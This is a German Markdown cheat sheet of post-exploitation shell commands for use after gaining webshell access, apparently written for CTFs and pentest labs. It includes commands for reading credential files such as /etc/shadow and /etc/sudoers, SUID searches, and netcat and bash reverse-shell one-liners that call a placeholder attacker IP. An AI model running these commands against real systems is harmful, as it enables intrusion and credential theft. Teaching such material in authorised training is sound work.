# 🧪 cmdExamplesFromShell.md

## 🎯 Kontext

Diese Datei enthält nützliche Shell-Befehle, die häufig **nach erfolgreichem Zugriff über eine Webshell** verwendet werden – z. B. durch eine PHP Remote Code Execution (RCE), Datei-Upload oder Command Injection.  
Sie eignet sich hervorragend für **CTFs**, **Penetration Testing Labs** oder als Nachschlagewerk für den **Post-Exploitation-Prozess**.

> ⚠️ **Hinweis:**  
> Die Befehle dienen ausschließlich **Schulungszwecken** oder autorisierten Tests in isolierten, legalen Umgebungen.  
> Jeder unautorisierte Zugriff auf Drittsysteme ist illegal und strafbar.

---

## 🧠 Informationsgewinnung

```bash
whoami                  # Aktueller Benutzer
id                      # UID, GID, Gruppen
pwd                     # Aktuelles Verzeichnis
hostname                # Hostname des Systems
uname -a                # Vollständige Systeminformationen
uname -r                # Kernel-Version
```

---

## 🗂️ Dateisystem & Verzeichnisse

```bash
ls -la                  # Aktuellen Verzeichnisinhalt anzeigen
ls -la /root            # Root-Verzeichnis anzeigen (falls zugänglich)
ls -la /home            # Benutzerverzeichnisse anzeigen
ls -la /var/www         # Webserver-Verzeichnis
cat /etc/passwd         # Benutzerliste
cat /etc/shadow         # Passworthashes (nur root)
cat /etc/group          # Gruppeninformationen
cat /etc/sudoers        # Sudo-Rechte überprüfen
```

---

## 🌐 Netzwerk-Analyse
```bash
ifconfig                # Netzwerkinterfaces (älter)
ip a                    # Netzwerkinterfaces (neuer)
netstat -an             # Offene Ports
netstat -tulpn          # Dienste mit Ports und PIDs
```

---

## 🔧 Systemdienste & Prozesse
```bash
ps aux                  # Laufende Prozesse anzeigen
top                     # Prozesse live
who -a                  # Aktive Benutzer
w                       # Aktive Sessions
```

--- 

## 🔐 Privilege Escalation vorbereiten
```bash
find / -type f -perm -4000 2>/dev/null   # SUID-Dateien finden
sudo -l                                 # Welche Befehle kann ich als root ausführen?
which nc                                # Netcat vorhanden?
which python                            # Python vorhanden?
which perl                              # Perl vorhanden?
```

---

## 📡 Kommunikation (Reverse Shells)
### Netcat Reverse Shell (Linux)
```bash
nc <attacker-ip> 4444 -e /bin/bash
```

### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```
> ⚠️ Hörer vorbereiten mit:
```bash 
nc -lvnp 4444
```

---

## 🔍 Dateisystem manipulieren

```bash
touch test.txt                # Leere Datei anlegen
echo "test" > test.txt        # Text in Datei schreiben
cat test.txt                  # Datei anzeigen
rm test.txt                   # Datei löschen
```

---

## 💡 Befehle debuggen (z. B. bei PHP-Webshell)
Wenn ein Befehl nicht direkt ausgeführt wird (z. B. bei exec()), kann es helfen, einfache Varianten zu testen:

```bash
whoami;id;uname -a
```

**Oder:**

```bash
echo START && whoami && echo END
```

--- 

## 🔐 Empfehlung für defensives Logging (Blue Team)

```bash
last                       # Letzte Logins
dmesg                      # Kernel-Logs
journalctl -xe             # Systemd-Logs (sofern aktiv)
tail -f /var/log/auth.log  # SSH/Authentifizierungsversuche
```

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!


---

## 📚 Siehe auch:

- [php_web_shell_bypass_tricks.md](03-web-security/phpWebShell/php_web_shell_bypass_tricks.md)
- [post_exploitation_tools.md](04-os-enumeration/post_exploitation_tools.md)
- [php_web_shell_usage.md](03-web-security/phpWebShell/php_web_whell_usage.md)
